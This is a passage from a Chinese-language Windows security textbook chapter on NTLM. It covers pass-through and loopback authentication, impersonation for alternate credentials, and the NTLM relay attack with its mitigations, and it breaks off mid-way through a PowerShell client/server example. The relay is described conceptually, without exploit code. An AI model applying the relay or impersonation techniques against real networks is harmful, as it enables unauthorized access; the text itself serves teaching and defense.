为了使客户端和服务器能够使用 NTLM 成功进行身份验证，双方必须知道用户的密码（或者更准确地说，是其 NT 哈希）。如果你正在对独立机器进行身份验证，则必须在机器的本地 SAM 数据库中设置该密码。在小型网络中配置此值并不太困难，但在由许多机器组成的大型网络中，手动执行此操作将变得难以管理。

在域网络中，域控制器负责管理用户的 NT 哈希。那么，NTLM 如何在此类环境中运行？域控制器上的 Netlogon 服务支持 *传递认证* 的概念，以促进域内其他系统上的 NTLM 身份验证。图 13-2 提供了域中 NTLM 身份验证过程的示例。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure13-2.webp)

图 13-2：NTLM 传递认证概述

NTLM 身份验证过程正常开始：客户端向服务器发送 NEGOTIATE 令牌 ❶，服务器生成质询并通过 CHALLENGE 令牌将其返回给客户端 ❷。然后，客户端使用用户的 NT 哈希生成 AUTHENTICATE 令牌，并将其发送给服务器 ❸。

此时，问题出现了。服务器没有用户的 NT 哈希，因此无法派生必要的加密值，如 NT 质询。因此，服务器将服务器质询和 AUTHENTICATE 令牌打包，并通过域控制器上的 NetrLogonSamLogon API 发送这些内容 ❹。你可能还记得 Chapter 12 中提到的，Windows 使用此 API 进行交互式身份验证。该 API 具有多种模式，其中一种可以在不需要用户密码的情况下验证 NTLM 身份验证值。

请注意，域控制器不会验证 MIC，因为这需要所有三个身份验证令牌。相反，服务器根据用户的 NT 哈希和 NT 质询值计算用于验证的会话密钥，并将其返回给请求的服务器。这使其能够确保身份验证未被篡改。

Windows 服务器永远不会访问用户的完整密码或 NT 哈希，只会访问会话密钥。这导致了 *双跳问题*：经过身份验证的用户可以访问存储在服务器本地的资源，但该用户不能用于访问域网络上其他服务器上的资源。

从安全角度来看，这是一件好事，因为它防止恶意服务重新利用用户的身份。然而，这也降低了灵活性，因为这意味着你不能在不要求用户向该代理后面的每个服务重新进行身份验证的情况下，轻易实现经过身份验证的代理服务。Kerberos 通过委派解决了双跳问题，我将在 Chapter 14 中更详细地描述。

#### 本地回环认证

在之前的示例中，我选择在获取出站身份验证凭据句柄时指定用户名和域。虽然集成 Windows 身份验证不要求你指定用户名或域，但如果你想在本地机器上创建网络登录会话，则需要这样做。让我们修改 代码清单 13-1 中的脚本，以在不指定用户名或域的情况下构建出站凭据：


```
PS> $credout = New-LsaCredentialHandle -Package "NTLM" -UseFlag Outbound
```


现在重新运行身份验证会话。格式化后的令牌应类似于 代码清单 13-10 中的内容。




```
<NTLM NEGOTIATE>
Flags: Unicode, Oem, RequestTarget, NTLM, OemDomainSupplied,
OemWorkstationSupplied, AlwaysSign, ExtendedSessionSecurity, Version,
Key128Bit, Key56Bit
❶ Domain: DOMAIN
Workstation: GRAPHITE
Version: 10.0.XXXXX.XX

<NTLM CHALLENGE>
❷ Flags     : Unicode, RequestTarget, NTLM, LocalCall,...
TargetName: DOMAIN
Challenge : 9900CFB9C182FA39
❸ Reserved  : 5100010000000000
Version   : 10.0.XXXXX.XX
--snip--

<NTLM AUTHENTICATE>
❹ Flags      : Unicode, RequestTarget, NTLM, LocalCall,...
❺ LM Response:
NT Response:
Version    : 10.0.XXXXX.XX
MIC        : 34D1F09E07EF828ABC2780335EE3E452

PS> Get-NtLogonSession -Token $token
LogonId           UserName       LogonType         SessionId
-------           --------       ---------         ---------
❻ 00000000-000A0908 GRAPHITE\user  Interactive       2

PS> Get-NtTokenId -Authentication
LUID
----
❼ 00000000-000A0908
```


*代码清单 13-10：来自本地回环认证的格式化令牌*

你可能会注意到，这三个认证令牌都发生了变化。第一个变化出现在NEGOTIATE令牌中，现在它包含了域名和工作站名称❶。接下来的变化发生在CHALLENGE令牌中：出现了一个新标志LocalCall❷，并且之前为零的Reserved字段现在有了值❸。LocalCall标志表示认证来自本地机器，而Reserved字段是创建CHALLENGE令牌的服务器安全上下文的唯一标识符。

最后的变化出现在AUTHENTICATE令牌中。虽然LocalCall标志仍然存在❹，但LM响应和NT响应字段现在完全为空❺。这明确表明认证过程已经改变。如果我们检查最终令牌对象的登录会话，会发现它是一个交互式会话，而不是网络会话❻。原因是LSA已将调用者的令牌副本返回给服务器，正如通过比较登录ID与有效令牌中的认证ID所看到的那样❼。

让我们更仔细地看看LocalCall标志。它的值基于NEGOTIATE认证令牌中的域名和工作站名称。如果这些值指向本地机器，则启用本地回环认证。初始令牌中没有其他唯一标识符来触发该标志，并且不需要有正在进行的出站认证过程来选择该标志。此外，该标志未在NEGOTIATE令牌的标志中指定，因此它不是在客户端和服务器之间协商的。

在撰写本文时，微软未在*MS-NLMP*中记录LocalCall标志，大概是因为它不应在本地机器之外被支持。然而，如你所见，仅提供正确的NEGOTIATE令牌就会触发本地回环认证。记录此标志将有助于诊断可能因该标志在网络中出现而导致的认证失败。

为什么LSA要实现本地回环认证？一个原因是网络认证会导致用户被重新认证，而某些本地服务（如SMB）允许本地交互用户访问文件共享，但不允许网络用户。因此，这种本地回环允许SMB服务器看到本地用户并授予访问权限。

#### 替代客户端凭据

我们已经看到了如何使用PowerShell命令以调用用户身份进行认证。这通常是你想要实现的行为，因为当前用户通常希望以自身身份访问某些网络资源。然而，底层API支持多种机制，允许你以不同用户身份通过网络进行认证。更改用户身份很有用，因为它使你无需交互式重新认证即可访问网络资源。

##### 使用显式凭据

如果你知道新用户的完整凭据，可以在创建客户端认证上下文的凭据句柄时指定它们。为此，调用New-LsaCredentialHandle并传递UserName、Domain和Password参数。

然而，你可能不希望将用户密码留在PowerShell的命令历史中。一种替代方案是指定ReadCredential参数，它将从用户处读取凭据，而不会将其存储在命令历史中。代码清单 13-11显示了一个示例。




```
PS> $cout = New-LsaCredentialHandle -Package NTLM -UseFlag Outbound 
-ReadCredential
PS> UserName: admin
PS> Domain: GRAPHITE
PS> Password: ********
```


*代码清单 13-11：使用用户指定的凭据创建凭据句柄*

现在，你可以将凭据句柄传递给New-LsaClientContext以创建客户端上下文。你不需要更改服务器端，它使用LSA管理的凭据。

##### 模拟令牌

在创建凭据句柄时，LSA通常根据调用用户的身份来确定要使用的网络凭据，该身份从调用SSPI API的进程的主令牌中检索。但是，如果你有另一个用户的令牌，你可以在创建凭据句柄时模拟该用户，以使用不同的身份。以管理员身份运行代码清单 13-12中的命令。




```
PS> $credout = Invoke-NtToken -System {
    New-LsaCredentialHandle -Package "NTLM" -UseFlag Outbound
}
```


*代码清单 13-12：为* SYSTEM *用户创建凭据句柄*

在代码清单 13-12中，我们为*SYSTEM*用户创建了一个凭据句柄。*SYSTEM*用户没有显式密码可用于使用代码清单 13-11中的方法进行认证；因此，你必须模拟令牌来为其创建凭据句柄。

在调用 `New-LsaCredentialHandle` 命令时，您只需模拟令牌一次。后续用于创建和更新客户端上下文的所有调用都不需要您模拟该令牌。

如果您拥有完整的凭据，另一种方法是使用 `NewCredentials` 登录类型创建令牌，这在第12章中简要提及。这将创建一个具有相同本地用户身份的令牌，但会替换网络身份验证凭据，如代码清单 13-13所示。




```
PS> $password = Read-Host -AsSecureString -Prompt "Password"
PS> $new_token = Get-NtToken -Logon -LogonType NewCredentials
-User "Administrator" -Domain "GRAPHITE" -SecurePassword $password
PS> $credout = Invoke-NtToken $new_token {
    New-LsaCredentialHandle -Package "NTLM" -UseFlag Outbound
}
```


*代码清单 13-13：使用 NewCredentials 令牌创建凭据句柄*

在这里，我们通过使用 `Get-NtToken` 命令生成一个 `NewCredentials` 类型的令牌来创建凭据句柄，然后在调用 `New-LsaCredentialHandle` 时模拟该令牌。

您可能会想，既然知道完整的凭据，为什么不直接在创建凭据句柄时指定它们呢？在本例中，这确实是更简单的解决方案。然而，有时您无法直接控制凭据句柄的创建。这种情况可能发生在网络身份验证发生在另一个API内部，而该API使用调用者的身份来访问远程资源时。在这种情况下，您可以在调用该API时模拟 `NewCredentials` 令牌，以使用您指定的凭据。重要的是，由于模拟，只有网络凭据会改变；本地身份保持不变，因此您不会意外地使用错误的用户账户访问本地资源。

让我们通过描述一种针对NTLM身份验证协议的实际攻击来结束本章。这种攻击允许您在不需知道用户密码的情况下，重新利用另一个用户的凭据。

### NTLM中继攻击

你可能已经注意到NTLM的一个特点：虽然LSA执行认证，但认证令牌的传输依赖于客户端和服务器应用程序。LSA如何确保它在向正确的计算机进行认证？它无法直接做到这一点：它需要客户端和服务器应用程序的帮助。这导致了一个安全漏洞，攻击者可以利用一种称为*NTLM中继*的攻击来利用该漏洞。在本节中，我们将探讨这种攻击以及微软如何尝试修复该漏洞。

#### 攻击概述

图13-3展示了NTLM中继攻击的基本设置。



![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure13-3.webp)

图13-3：NTLM中继攻击示例

涉及三个系统：一台Windows客户端机器、一台Windows服务器和攻击者的机器。攻击者的目标是访问服务器上的SMB文件共享。然而，他们没有成功执行NTLM认证所需的凭据。另一方面，客户端确实拥有合适的凭据，并且由于交互式Windows认证，如果被礼貌地请求，它将在无需用户交互的情况下使用这些凭据。

第一步是攻击者说服客户端机器连接到攻击者的Web服务器。虽然攻击者想要访问SMB，但来自客户端的NTLM认证可以通过任何支持认证的协议进行，包括HTTP。说服客户端建立连接可以简单到在客户端访问的网页中添加一个指向攻击者Web服务器的图片。

攻击者接受客户端的HTTP连接并启动NTLM认证过程，这导致客户端向攻击者发送一个NEGOTIATE令牌❶。攻击者不处理该令牌，而是打开一个到目标SMB服务器的新连接，并将NEGOTIATE令牌传递过去，就好像是他们自己创建的一样❷。

SMB服务器将响应一个CHALLENGE令牌，攻击者可以将此令牌转发给客户端以继续认证过程❸。客户端应向攻击者的Web服务器响应一个AUTHENTICATE令牌，攻击者可以将其转发给SMB服务器❹。假设服务器接受客户端的凭据，攻击者现在就在不知道用户密码的情况下建立了到SMB服务器的认证连接。

这种攻击是一个严重的安全问题。微软已尝试实施各种修复措施，主要是通过向NTLM添加更多功能。然而，这些修复的问题在于它们是自愿选择的，出于向后兼容性的原因：NTLM和SMB是太老的协议，某些客户端和服务器不支持新功能。尽管如此，让我们讨论Windows如何缓解该漏洞。

#### 活动服务器挑战

执行NTLM中继攻击的最简单方式是认证回受害者的机器。例如，在图13-3中，HTTP客户端和SMB服务器可以位于同一台Windows机器上。如果该机器既是客户端又是服务器，认证凭据将始终有效。

为了修复这种攻击，Windows开始维护一个当前活动服务器挑战的表，如果CHALLENGE令牌包含由同一机器发出的服务器挑战，则拒绝创建AUTHENTICATE令牌。两台机器之间发生碰撞的可能性很小，但使用随机的8字节挑战，这种情况很少发生。

#### 签名和密封

对抗NTLM中继攻击的另一种方法是使包含NTLM认证的外部协议（如SMB）以某种方式依赖认证过程。这归结为使用攻击者唯一不拥有的信息：用户的密码。

SSPI API和NTLM支持在AUTHENTICATE令牌中包含一个由用户密码加密的随机生成的会话密钥。然后可以使用此会话密钥生成MIC，文档中称之为*签名*。MIC是使用MakeSignature SSPI API为外部协议生成的，并使用VerifySignature API进行验证。该密钥还可以用于使用EncryptMessage和DecryptMessage API加密和解密任意数据，文档中称之为*密封*。由于攻击者无法在不知道密码的情况下解密会话密钥，因此他们无法生成有效的签名或加密数据来与中继的服务器通信。

要请求会话密钥，你可以在创建客户端或服务器上下文时，通过 `RequestAttribute` 参数指定 `Confidentiality` 或 `Integrity` 标志。例如，在调用 `New-LsaClientContext` 时，你可以指定以下命令：


```
PS> $client = New-LsaClientContext -CredHandle $credout -RequestAttribute 
Integrity
```


代码清单 13-14 展示了当我们在创建客户端和服务器上下文时指定 `Integrity` 请求属性标志后，客户端的 `AUTHENTICATE` 令牌。




```
<NTLM AUTHENTICATE>
❶ Flags      : Unicode, RequestTarget, Signing, NTLM, AlwaysSign,
ExtendedSessionSecurity, TargetInfo, Version,
Key128Bit, KeyExchange, Key56Bit
--snip--
</NTLMv2 Challenge Response>
❷ Session Key: 5B13E92C08E140D37E156D2FE4B0EAB9
Version    : 10.0.18362.15
MIC        : 5F5E9B1F1556ADA1C07E83A715A7809F
```


*代码清单 13-14：检查 AUTHENTICATE 令牌中的会话密钥*

如输出所示，这在两个重要方面改变了 NTLM 流程。首先，添加了 NTLM `KeyExchange` 标志 ❶。该标志表示客户端已生成会话密钥。标志中还包含了 `Signing`，向服务器表明客户端希望允许基于会话密钥对内容进行签名。如果使用 `Confidentiality` 请求属性标志，则会设置两个 AUTHENTICATE 标志：`Signing` 和 `Sealing`。

如果设置了任一标志，NTLMv2 质询中会包含一个由客户端生成的加密会话密钥 ❷。这是用于所有后续加密操作的基础密钥。该密钥使用 RC4 加密算法以及由用户哈希和 NT 响应派生出的密钥进行加密。

如果在启用签名或密封后验证 MIC，你会注意到生成的值不再与 AUTHENTICATE 令牌中的值匹配。这是因为如果加密会话密钥可用，则会使用它来代替基础会话密钥。你可以通过修改 代码清单 13-9 中所示的 `Get-Mic` 函数来修复此行为，添加 代码清单 13-15 中的粗体部分。




```
$session_key = Get-Md5Hmac -Key $Key -Data $Proof
if ($authToken.EncryptedSessionKey.Count -gt 0) {
    $session_key = Unprotect-RC4 -Key $session_key
-Data $AuthToken.EncryptedSessionKey
}
```


*代码清单 13-15：修改 Get-Mic 函数以解密会话密钥用于 MIC 计算*

`MakeSignature` 和 `VerifySignature` API 通过 `Get-LsaContextSignature` 和 `Test-LsaContextSignature` 命令公开，而 `EncryptMessage` 和 `DecryptMessage` API 则通过 `Protect-LsaContextMessage` 和 `Unprotect-LsaContextMessage` 命令公开。我们将在本章末尾的实战示例中介绍这些加密命令的使用；现在，代码清单 13-16 展示了签名命令的一个简单用法。




```
❶ PS> $server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServerContext $server $client
PS> Update-LsaClientContext $client $server
PS> Update-LsaServerContext $server $client
PS> $msg = $(0, 1, 2, 3)
❷ PS> $sig = Get-LsaContextSignature -Context $client -Message $msg
PS> $sig | Out-HexDump
01 00 00 00 A7 6F 57 90 8B 90 54 2B 00 00 00 00

❸ PS> Test-LsaContextSignature -Context $server -Message $msg -Signature $sig
True

❹ PS> Test-LsaContextSignature -Context $server -Message $msg -Signature $sig
False
```


*代码清单 13-16：生成并验证消息签名*

我们首先完成客户端到服务器的身份验证过程，以设置完整性支持 ❶。然后，我们使用客户端身份验证上下文为一个简单的 4 字节消息生成签名 ❷。此过程假设数据正在发送到服务器进行验证；我们可以通过指定不同的身份验证上下文来反转此过程。我们将生成的签名值显示为十六进制。

然后，我们使用 `Test-LsaContextSignature` 命令通过服务器身份验证上下文验证签名 ❸。该命令返回一个布尔值，指示签名是否有效。对于此调用，验证返回 `True`。但是，如果我们第二次检查签名 ❹，现在会得到 `False`，表明它不再有效。这是为什么呢？

客户端和服务器身份验证上下文维护一个 *序列号*，该序列号从 0 开始，每次签名或加密操作都会递增。生成或验证签名时会自动包含此序列号，服务器可以使用它来检查旧签名是否被重放（例如，攻击者是否试图发送相同的网络数据两次）。

在 代码清单 13-16 的示例中，我们使用序列号 0 生成了客户端的签名。在第一次验证中，服务器的身份验证上下文初始值也为 0，因此验证成功。但是，验证完成后，服务器的序列号递增为 1。因此，当我们再次尝试验证相同的签名时，序列号不再匹配，验证失败。

用于签名和密封的 RC4 加密算法存在许多弱点，这些不在本书的讨论范围内。然而，它在一定程度上缓解了 NTLM 中继攻击，并在没有其他密钥交换机制的情况下，为外部网络协议提供了基本的完整性和机密性保护。

SMB支持源自认证过程的签名和加密。然而，由于RC4的弱点，SMB不使用MakeSignature或EncryptMessage API；相反，它通过QueryContextAttribute SSPI API提取解密的会话密钥，并使用自己的加密和完整性检查算法。您可以通过访问客户端或服务器认证上下文上的SessionKey属性来查询会话密钥，如代码清单 13-17所示。




```
PS> $server.SessionKey | Out-HexDump
F3 FA 3A E0 8D F7 EE 34 75 C5 00 9F BF 77 0E E1
PS> $client.SessionKey | Out-HexDump
F3 FA 3A E0 8D F7 EE 34 75 C5 00 9F BF 77 0E E1
```


*代码清单 13-17：提取认证上下文的会话密钥*

#### 目标名称

另一种阻止NTLM中继攻击的技术是在AUTHENTICATE令牌中添加一个标识符，指示NTLM认证所针对的目标名称。由于AUTHENTICATE令牌受MIC保护，而MIC源自用户密码，因此目标名称很难被篡改。

在我们的NTLM中继示例中，如果客户端启用了目标名称，它可能会将目标名称设置为*HTTP/attacker.domain.local*，其中*HTTP*表示请求的服务类型，*attacker.domain.local*是它正在认证的地址。攻击者可以将AUTHENTICATE令牌传递给SMB服务器，但由于服务器运行不同的服务*CIFS*，并且位于不同的网络地址*fileserver.domain.local*，名称将不匹配，认证将失败。

要指定目标名称，请在创建客户端认证上下文时设置Target参数：


```
PS> $client = New-LsaClientContext -CredHandle $credout -Target "HTTP/localhost"
```


请注意，目标名称可以完全任意，但服务类型或网络地址不能。例如，名称*BLAH*不会被拒绝，但名称*BLAH/microsoft.com*会被拒绝（除非您恰好运行在*microsoft.com*上的服务器）。名称格式遵循Kerberos认证中使用的服务主体名称（SPN）格式。我们将在下一章描述Kerberos如何使用SPN。

当您运行NTLM认证时，您现在应该在NTLMv2质询响应块中看到目标名称：


```
TargetName - HTTP/localhost
```


您可以使用ClientTargetName属性从服务器认证内容中提取目标名称：


```
PS> $server.ClientTargetName
HTTP/localhost
```


目标名称保护的问题在于它必须启用才能生效。默认情况下，客户端不会设置它，SMB服务器也不要求指定它。此外，攻击者可以伪造名称，因为它通常基于某个网络地址。例如，攻击者可能能够污染客户端的DNS缓存或使用其他本地网络攻击来劫持服务器的IP地址。

#### 通道绑定

我们将讨论的针对NTLM中继的最终保护是*通道绑定*，微软也将其称为*扩展保护认证（EPA）*。通道绑定的目的是在NTLMv2 AUTHENTICATE令牌中添加一个额外的值，MIC将保护该值免受篡改。

通道绑定不是使用任意名称，而是允许客户端和服务器指定与外部网络协议某些属性相关的二进制令牌。通道绑定的一种常见用途是在*传输层安全（TLS）*中，这是一种通用网络协议，用于加密和验证另一种流式协议。这可以防止加密协议的内容被检查网络流量的人泄露，并能够检测篡改。例如，它用于将HTTP保护为HTTPS。

在TLS通信中，客户端和服务器可以指定TLS服务器的X.509证书作为通道绑定令牌。TLS协议首先验证证书，确保连接确实建立到目标服务器。然后将NTLM认证绑定到该通道。这可以防止攻击者通过向TLS通道注入数据来劫持认证。如果攻击者将TLS连接重定向到他们自己的服务器，证书将不同，并将使用不同的通道绑定值。

要启用通道绑定，请在客户端和服务器认证上下文中指定ChannelBinding参数：


```
PS> $client = New-LsaClientContext -CredHandle $credout -ChannelBinding @(1, 2, 3)
PS> $server = New-LsaServerContext -CredHandle $credin -ChannelBinding @(1, 2, 3)
```


如果您现在运行NTLM认证过程，您会发现通道绑定值（以前全为零）现在具有类似以下的值：


```
ChannelBinding - BAD4B8274DC394EDC375CA8ABF2D2AEE
```


ChannelBinding值是SEC_CHANNEL_BINDINGS结构的MD5哈希，该结构包括指定给认证上下文的通道绑定数据。对于相同的数据，每次认证的值应该始终相同。对于PowerShell模块中使用的实现，您可以使用代码清单 13-18中的函数来计算哈希。




```
PS> function Get-BindingHash {
    Param(
         [byte[]]$ChannelBinding
    )
    $stm = [System.IO.MemoryStream]::new()
    $writer = [System.IO.BinaryWriter]::new($stm)
    $writer.Write(0) # dwInitiatorAddrType
    $writer.Write(0) # cbInitiatorLength
    $writer.Write(0) # dwAcceptorAddrType
    $writer.Write(0) # cbAcceptorLength
    $writer.Write($ChannelBinding.Count) # cbApplicationDataLength
    $writer.Write($ChannelBinding) # Application Data
    [System.Security.Cryptography.MD5Cng]::new().ComputeHash($stm.ToArray())
}
PS> Get-BindingHash -ChannelBinding @(1, 2, 3) | Out-HexDump
BA D4 B8 27 4D C3 94 ED C3 75 CA 8A BF 2D 2A EE
```


*代码清单 13-18：计算通道绑定哈希*

与目标名称一样，系统必须主动选择启用此功能。如果服务器未指定通道绑定令牌，则AUTHENTICATE令牌中的通道绑定哈希将不会被检查。仅当服务器指定的通道绑定令牌不匹配时，认证过程才会失败。

### 工作示例

让我们用一个工作示例来结束本章，该示例使用了你在本章中学到的命令。在这个示例中，我们将开发一个简单的网络协议，该协议使用NTLM和认证上下文机制来通过网络认证用户，并提供加密和完整性验证。由于这个示例相当复杂，我将把它分成几个部分。

#### 概述

.NET框架已经自带了NegotiateStream类，它使用SSPI来认证和加密网络通信。尽管如此，你会发现自己构建一个类似的机制是很有启发性的。我们将开发的网络协议不会很健壮，甚至不安全；它仅仅是为了演示本章所描述命令的实际用途。

NTLM的安全属性（及其加密和完整性验证机制）按现代标准来看非常薄弱，所以如果你想要一个健壮的加密网络协议，请使用TLS。TLS可以通过.NET中的SslStream类获得。

图13-4展示了我们将构建的协议的基本概述。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure13-4.webp)

图13-4：网络协议概述

我们将使用TCP来促进客户端和服务器之间的通信❶。TCP是一种可靠协议，几乎内置在地球上的每个计算设备中——但由于它是一种流式协议，你发送或接收的消息之间没有分隔。我们需要一种方法来分割流，以便客户端和服务器知道它们何时读取了单个消息。为了简单起见，我们将数据作为ASCII文本发送，并在末尾添加换行符来表示消息的结束。

一旦建立了TCP连接，我们将执行NTLM认证❷。由于NTLM的认证令牌是二进制的，我们将使用base64算法对它们进行编码，该算法将二进制数据转换为由64个ASCII字符组成的文本字符串。

然后我们可以在客户端和服务器之间来回发送消息❸。我们将使用Protect-LsaContextMessage和Unprotect-LsaContextMessage PowerShell命令来加密和解密数据。由于加密过程会生成加密消息和单独签名，我们将它们作为两个独立的base64文本行发送。

#### 代码模块

客户端和服务器将执行许多相同的任务，例如发送和接收消息，因此将这些代码放入一个单独的模块中，以便双方都能轻松引用，是合理的。为示例代码创建一个目录，并将代码清单 13-19复制到其自己的文件中，命名为*network_protocol_common.psm1*，因为服务器和客户端实现都需要访问它。

```
Import-Module NtObjectManager
function Get-SocketClient {
    param(
        [Parameter(Mandatory)]
        $Socket
    )

    $Socket.Client.NoDelay = $true
    $stream = $Socket.GetStream()
    $reader = [System.IO.StreamReader]::new($stream)
    $writer = [System.IO.StreamWriter]::new($stream)
    $writer.AutoFlush = $true
    return @{
        Reader = $reader
        Writer = $writer
    }
}

function Send-Message {
    param(
        [Parameter(Mandatory)]
        $Client,
        [Parameter(Mandatory)]
        $Message
    )

    Write-Verbose "Sending Message"
    Format-HexDump -Byte $Message -ShowAll | Write-Verbose
    $text = [System.Convert]::ToBase64String($Message)
    $Client.Writer.WriteLine($text)
}

function Receive-Message {
    param(
        [Parameter(Mandatory)]
        $Client
    )

    $text = $Client.Reader.ReadLine()
    $ba = [System.Convert]::FromBase64String($text)
    Write-Verbose "Received Message"
    Format-HexDump -Byte $ba -ShowAll | Write-Verbose

    Write-Output -NoEnumerate $ba
}

function Send-TextMessage {
    param(
        [Parameter(Mandatory)]
        $Client,
        [Parameter(Mandatory)]
        $Message,
        [Parameter(Mandatory)]
        $Context
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
    $enc = Protect-LsaContextMessage -Context $Context -Message $bytes
    Send-Message -Client $Client -Message $enc.Message
    Send-Message -Client $Client -Message $enc.Signature
}

function Receive-TextMessage {
    param(
        [Parameter(Mandatory)]
        $Client,
        [Parameter(Mandatory)]
        $Context
    )

    $msg = Receive-Message -Client $Client
    if ($msg.Length -eq 0) {
        return ""
    }

    $sig = Receive-Message -Client $Client
    if ($sig.Length -eq 0) {
        return ""
    }

    $dec = Unprotect-LsaContextMessage -Context $Context -Message $msg -Signature $sig
    [System.Text.Encoding]::UTF8.GetString($dec)
}

Export-ModuleMember -Function 'Get-SocketClient', 'Send-Message',
'Receive-Message', 'Send-TextMessage', 'Receive-TextMessage'
```

*代码清单 13-19：协议的共享模块代码*

模块代码包含五个函数。第一个函数Get-SocketClient接受一个已连接的TCP套接字，并创建一个StreamReader和StreamWriter类。这些类允许你从二进制流中读取和写入文本行，在这种情况下是通过网络。我们还设置了套接字的NoDelay属性，该属性禁用了所谓的Nagle算法。该算法的细节超出了本书的范围，但它确保写入套接字的数据立即发送到网络，而不是被缓冲。

接下来的两个函数Send-Message和Receive-Message通过TCP套接字发送和接收二进制消息。要发送消息，我们首先将二进制数据转换为base64字符串，然后将其写入writer对象。对于接收函数，我们执行相反的操作，从TCP套接字读取一行，并将其从base64转换回二进制数据。请注意，我们使用Write-Verbose PowerShell命令打印我们发送和接收的消息。默认情况下，PowerShell不会显示这种详细输出；我稍后会向你展示如何启用它。

最后两个函数Send-TextMessage和Receive-TextMessage发送和接收加密的文本消息。要发送加密消息，我们使用UTF8文本编码将消息转换为二进制数据，这允许我们在字符串中使用任何Unicode字符。然后我们使用Protect-LsaContextMessage命令加密二进制数据。我们必须使用现有的Send-Message命令将加密数据和签名作为单独的行发送。同样，要接收数据，我们执行发送操作的逆操作。

#### 服务器实现

我们将从实现服务器开始，因为没有服务器，测试任何客户端代码都会很困难。代码清单 13-20包含服务器实现。

```
❶ param(
    [switch]$Global,
    [int]$Port = 6543
)

❷ Import-Module "$PSScriptRoot\network_protocol_common.psm1"
$socket = $null
$listener = $null
$context = $null
$credin = $null

try {
  ❸ $Address = if ($Global) {
        [ipaddress]::Any
    } else {
        [ipaddress]::Loopback
    }

  ❹ $listener = [System.Net.Sockets.TcpListener]::new($Address, $port)
    $listener.Start()
    $socket = $listener.AcceptTcpClient()
    $client = Get-SocketClient -Socket $socket
    Write-Host "Connection received from $($socket.Client.RemoteEndPoint)"

  ❺ $credin = New-LsaCredentialHandle -Package "NTLM" -UseFlag Inbound
    $context = New-LsaServerContext -CredHandle $credin
-RequestAttribute Confidentiality

  ❻ $neg_token = Receive-Message -Client $client
    Update-LsaServerContext -Server $context -Token $neg_token
    Send-Message -Client $client -Message $context.Token.ToArray()
    $auth_token = Receive-Message -Client $client
    Update-LsaServerContext -Server $context -Token $auth_token

    if (!(Test-LsaContext -Context $context)) {
        throw "Authentication didn't complete as expected."
    }

  ❼ $target = "BOOK/$($socket.Client.LocalEndPoint.Address)"
    if ($context.ClientTargetName -ne $target) {
        throw "Incorrect target name specified: $($context.ClientTargetName)."
    }

    $user = Use-NtObject($token = Get-LsaAccessToken -Server $context) {
        $token.User
    }
    Write-Host "User $user has authenticated."
  ❽ Send-TextMessage -Client $client -Message "OK" -Context $context

  ❾ $msg = Receive-TextMessage -Client $client -Context $context
    while($msg -ne "") {
        Write-Host "> $msg"
        $reply = "User {0} said: {1}" -f $user, $msg.ToUpper()
        Send-TextMessage -Client $client -Message $reply -Context $context
        $msg = Receive-TextMessage -Client $client -Context $context
    }
} catch {
    Write-Error $_
} finally {
    if ($null -ne $socket) {
        $socket.Close()
    }
    if ($null -ne $listener) {
        $listener.Stop()
    }
    if ($null -ne $context) {
        $context.Dispose()
    }
    if ($null -ne $credin) {
        $credin.Dispose()
    }
}
```

*代码清单 13-20：一个简单的服务器实现*

将这段代码复制到与代码清单 13-19中模块文件相同的目录下，并保存为 *network_protocol_server.ps1*。

我们首先定义一些参数❶。如果你将代码作为脚本使用，可以通过在命令行接受参数的方式使其像函数一样工作。这样可以轻松更改脚本的行为。在本例中，我们定义了一个 `Global` 参数，它将更改我们绑定 TCP 服务器的网络接口，以及一个 `Port` 参数，即 TCP 端口号。

接下来，我们导入公共模块❷。这确保了代码清单 13-19中定义的函数可供服务器使用。然后我们设置绑定地址❸。如果设置了 `Global`，则绑定到 `Any`，这代表所有网络接口；否则，仅绑定到回环地址，该地址只能从本地访问。

> 注意
>
> *在测试服务器代码时，通常只绑定到回环地址。这可以确保网络上的其他计算机无法连接到你的服务器并可能滥用其功能。只有当你确信编写的任何代码都是安全的，或者处于没有其他参与者的网络中时，才绑定到所有网络接口。*

确定地址后，我们创建 `TcpListener` 类的实例，并绑定到地址和 TCP 端口❹。我们调用 `Start` 开始监听新连接，并通过调用 `AcceptTcpClient` 等待连接。此时，如果没有客户端，脚本将在此处停止。当建立连接时，我们将收到一个已连接的套接字对象，可以使用 `Get-SocketClient` 命令将其转换为客户端。然后我们打印出已连接客户端的地址。

现在，我们可以为 NTLM 设置新的服务器身份验证上下文❺，指定 `Confidentiality` 请求属性，以授予我们加密和解密消息的能力。然后我们与客户端协商身份验证❻。如果身份验证失败，或者在收到 `AUTHENTICATE` 令牌后仍未完成身份验证，我们将抛出错误以停止服务器脚本。

我们还会检查客户端在身份验证期间是否提供了合适的目标名称❼。其格式应为 *BOOK/<ADDRESS>*，其中 *<ADDRESS>* 是服务器的 IP 地址。如果目标名称不匹配，我们也会抛出致命错误。为了确认已认证用户的身份，我们从上下文中查询 `Token` 对象并打印用户名。为了告知客户端身份验证成功，我们发送一条确认消息❽。我们对该消息进行加密，以确保会话密钥匹配。

最后，我们可以开始接收来自客户端的文本消息❾。我们读取一条文本消息，如前所述，该消息将根据协商的身份验证上下文进行解密和验证。为了证明其被正确接收，我们将消息写入控制台。然后，我们将消息返回给客户端，在消息中附加用户名并将文本转换为大写，以示友好。

如果我们收到空消息，则将其视为关闭服务器的信号；我们只接受这一个连接。在退出脚本之前，我们确保清理资源，例如 TCP 服务器。现在让我们来看客户端的实现。

#### 客户端实现

在大多数情况下，客户端实现的是服务器的反向操作。代码清单 13-21 展示了其代码。将其复制到与代码清单 13-19中模块文件相同的目录下，命名为 *network_protocol_client.ps1*。

```
❶ param(
    [ipaddress]$Address = [ipaddress]::Loopback,
    [int]$Port = 6543
)

Import-Module "$PSScriptRoot\network_protocol_common.psm1"

$socket = $null
$context = $null
$credout = $null

try {
  ❷ $socket = [System.Net.Sockets.TcpClient]::new()
    $socket.Connect($Address, $port)
    $client = Get-SocketClient -Socket $socket
    Write-Host "Connected to server $($socket.Client.RemoteEndPoint)"

  ❸ $credout = New-LsaCredentialHandle -Package "NTLM" -UseFlag Outbound
    $context = New-LsaClientContext -CredHandle $credout
-RequestAttribute Confidentiality -Target "BOOK/$Address"
